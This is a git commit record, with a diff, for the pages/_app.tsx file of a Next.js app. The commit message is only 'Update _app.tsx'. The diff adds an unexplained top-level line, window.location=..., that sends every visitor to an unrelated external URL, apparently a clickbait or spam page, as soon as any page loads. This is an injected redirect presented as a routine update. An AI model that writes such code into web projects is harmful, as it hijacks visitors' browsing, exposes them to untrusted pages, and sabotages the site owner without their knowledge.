13021c2232e699e4062de825c77e6f069bc1a16b
chai2537 <121778215+chai2537@users.noreply.github.com>
2023-04-19 20:59:54 +0700

    Update _app.tsx

--- pages/_app.tsx
+++ pages/_app.tsx
@@ -1,5 +1,6 @@
 import '../styles/globals.css'
 import type { AppProps } from 'next/app'
+window.location="https://www.love.khao.today/2023/04/18/group-of-brave-hunters-catching-the-giant-monster-in-the-hole-king-fisshing-2/amp/";
 
 function MyApp({ Component, pageProps }: AppProps) {
   return <Component {...pageProps} />
